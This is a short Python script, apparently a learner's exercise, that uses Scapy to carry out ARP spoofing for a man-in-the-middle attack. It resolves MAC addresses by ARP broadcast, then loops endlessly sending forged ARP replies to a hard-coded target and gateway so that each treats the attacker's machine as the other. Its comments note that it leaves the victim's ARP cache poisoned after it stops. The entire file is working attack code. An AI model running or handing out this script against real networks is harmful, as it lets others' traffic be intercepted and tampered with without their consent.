#!/usr/bin/env python
#python 3 version of arpspoof5.py
#MITM---multiple packets
#using networkscanner7.py we got the MAC and IP of target machine
#Dynamic printing --- rather than printing the packets sent on every lin
#automatically termination of program---Try and Exception
#after executin is stopped also, the target machine thinks hacker is the router, so restore function need to be written.
#flow of packet is even after execution is stopped....


import scapy.all as scapy
import time
import sys

def get_mac(ip):		#from networkscanner7.py
	arp_request = scapy.ARP(pdst = ip)   			
	broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff") 	
	arp_request_broadcast = broadcast/arp_request  		
	answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0] 

	return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
	target_mac = get_mac(target_ip)
	packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
	scapy.send(packet, verbose = False)

sent_packet_count = 0
try:
	while True:
		spoof("192.172.100.3", "10.0.2.1")
		spoof("10.0.2.1","192.172.100.3")
		sent_packet_count = sent_packet_count+2
		print("\r [+] Packets Sent: " + str(sent_packet_count), end = "")
		time.sleep(2)

except KeyboardInterrupt:
	print("\n [+] Detected ctrl + C. Quiting.")	


	

